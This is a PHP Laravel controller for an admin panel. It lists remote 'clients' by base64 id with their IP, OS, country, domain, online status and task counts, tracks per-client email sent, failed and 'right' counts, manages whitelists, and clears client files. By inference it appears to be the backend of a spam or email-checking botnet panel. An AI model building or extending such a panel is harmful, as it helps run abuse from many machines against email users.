<?php

namespace App\Http\Controllers\Angular;

use App;
use App\Client;
use App\Http\Controllers\Controller;
use App\Whitelist;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Pagination\LengthAwarePaginator;
use Illuminate\Support\Facades\Storage;
use Monolog\Handler\StreamHandler;
use Monolog\Logger;

class Clients extends Controller
{
    public function clients(){
        $response = [];
        $clients = Storage::disk('client_data')->allFiles();
        $gitignore = array_search('.gitignore', $clients);
        if($gitignore !== false){
            unset($clients[$gitignore]);
        }
        $response['total_items'] = count($clients);
        $response['current_page'] = 1;

        foreach ($clients as $client){
            $base64 = preg_replace('#\/#', '', $client);

            $response['data'][] = [
                'base64' => $base64,
                'ip' => Client::getIP($base64),
                'os' => Client::getOsVer($base64),
                'valid' => Client::getBlack($base64),
            ];
        }
        return response()->json($response);
    }

    public function deleteOldClient($base64){
        $b = $base64;
        $path = $b[0].$b[1].'/'.$b[2].$b[3].'/'.$b[4].$b[5].'/'.substr($b, 6);
        Storage::disk('client_data')->delete($path);

        $path = [
            $b[0].$b[1].'/'.$b[2].$b[3].'/'.$b[4].$b[5],
            $b[0].$b[1].'/'.$b[2].$b[3],
            $b[0].$b[1],
        ];

        foreach ($path as $p){
            if(empty(Storage::disk('client_data')->allFiles($p))){
                Storage::disk('client_data')->deleteDirectory($p);
            }
        }
    }

    public function clients_new(){
        $model = Client::orderBy('id', 'desc')->paginate(20);
        $response['total_items'] = $model->total();
        $response['current_page'] = $model->currentPage();
        $response['items_per_page'] = $model->perPage();

        foreach($model as $r){
            $data = [
                'id' => $r->id,
                'base64' => $r->base64,
                'valid' => !empty($r->blacklist) ? $r->blacklist->valid : null,
            ];

            if(Client::isValid($r->base64)){
                $data['ip'] = Client::getIP($r->base64);
                $data['os'] = Client::getOsVer($r->base64);
            }else{
                $data['invalid'] = true;
            }

            $response['data'][] = $data;
        }

        return response()->json($response);
    }

    public function clients_online(Request $request){
        $post = $request->all();
        $model = Client::getOnline();
        $cache = App\ClientsCache::all()->toArray();
        $cache_merge = [];

        foreach ($cache as $v){
            $cache_merge[$v['base64']] = [
                'email_fail' => $v['email_fail'],
                'email_right' => $v['email_right'],
                'email_response' => $v['email_response'],
                'email_sent' => $v['email_sent'],
                'last_activity' => $v['last_activity'],
                'task_count' => $v['task_count'],
            ];
        }

        if(isset($post['online']) && $post['online'] != null){
            if($post['online'] == false){
                $model = array_except($cache_merge, array_keys($model));
            }
        }else{
            $model = array_merge($model, array_except($cache_merge, array_keys($model)));
        }

        if(isset($post['whiteList']) && $post['whiteList'] != null){
            $whiteList = Whitelist::all()->pluck('base64')->toArray();

            if($post['whiteList'] == true){
                $model = array_intersect_key($model, array_flip($whiteList));
            }else{
                $diff = array_diff(array_keys($model), $whiteList);
                $model = array_intersect_key($model, array_flip($diff));
            }
        }

        $response['total_items'] = count($model);
        $response['current_page'] = LengthAwarePaginator::resolveCurrentPage();
        $response['items_per_page'] = 100;
        $currentPageSearchResults = collect($model)->slice(
            ($response['current_page'] - 1) * $response['items_per_page'],
            $response['items_per_page']
        );
        $model = new LengthAwarePaginator(
            $currentPageSearchResults,
            count($model),
            $response['items_per_page']
        );

        foreach($model as $base64 => $r){
            $data = [
//                'base64' => Client::getBase64Cut($base64),
//                'base64_full' => $base64,
                'base64' => $base64,
            ];

            if(Client::isValid($base64)){
                $data['ip'] = Client::getIP($base64);
                $data['os'] = Client::getOsVer($base64);
                $data['ago'] = Carbon::createFromTimestamp($r['last_activity'])->diffForHumans();
                $data['valid'] = Client::getBlack($base64);
                $data['domain'] = Client::getDomain($base64);
                $data['country'] = Client::getCountry($base64);
                $data['white_list'] = Whitelist::where('base64', $base64)->first() ? true : false;
                $data['email_right'] = $r['email_right'] != 'undefined' ? $r['email_right'] : 0;
                $data['email_fail'] = $r['email_fail'] != 'undefined' ? $r['email_fail']: 0;
                $data['email_response'] = $r['email_response'] != 'undefined' ? $r['email_response'] : 0;
                $data['email_sent'] = $r['email_sent'];
                $data['task_count'] = $r['task_count'];
            }else{
                $data['invalid'] = true;
            }

            $response['data'][] = $data;
        }

        return response()->json($response);
    }

    public function setWhiteList(Request $request){
        $data = $request->all();

        foreach($data as $base64){
            $model = App\Whitelist::where('base64', $base64);
            $list = $model->get();
            $listed = $list->count();
            if($listed){
                $model->delete();
            }else{
                App\Whitelist::insert(['base64' => $base64]);
            }

            $view_log = new Logger('WhiteList');
            try{
                $client = new \GuzzleHttp\Client();
                $client->request("POST", config('api.white_list'), [
                    'multipart' => [
                        [
                            'name' => 'q',
                            'contents' => json_encode([
                                $listed ? 'deleted' : 'added' => [$base64]
                            ])
                        ]
                    ]
                ]);
                $view_log->pushHandler(new StreamHandler(storage_path('logs/whitelist.log'), Logger::INFO));
                $view_log->addInfo(($listed ? 'deleted' : 'added').' '.$base64);
            }catch (\Exception $e){
                $view_log->pushHandler(new StreamHandler(storage_path('logs/whitelist.log'), Logger::ERROR));
                $view_log->addInfo($e->getMessage());
            }
        }
    }

    public function whiteListClearAll(){
        Whitelist::getQuery()->delete();
    }

    public function whiteListAddAll(){
        $clients = array_keys(Client::getOnline());
        $clients = App\Blacklist::whereIn('base64', $clients)
            ->where('valid', true)
            ->get()
            ->map(function ($item){
                return ['base64' => $item->base64];
            })
            ->toArray();

        Whitelist::insert($clients);
        Whitelist::whereNotIn('base64', $clients)->delete();
    }

    public function clientsClear(Request $request){
        $post = $request->all();
        $storage = Storage::disk('client_data');
        $clients = $storage->allFiles();
        $gitignore = array_search('.gitignore', $clients);
        if($gitignore !== false){
            unset($clients[$gitignore]);
        }

        foreach($clients as $client){
            if($storage->exists($client)){
                $data = file(storage_path('client_data/'.$client));

                if(!empty($data) && $post['domain'] != preg_replace('#\\r\\n#', '', $data[0])){
                    $storage->delete($client);
                }
            }
        }
    }
}
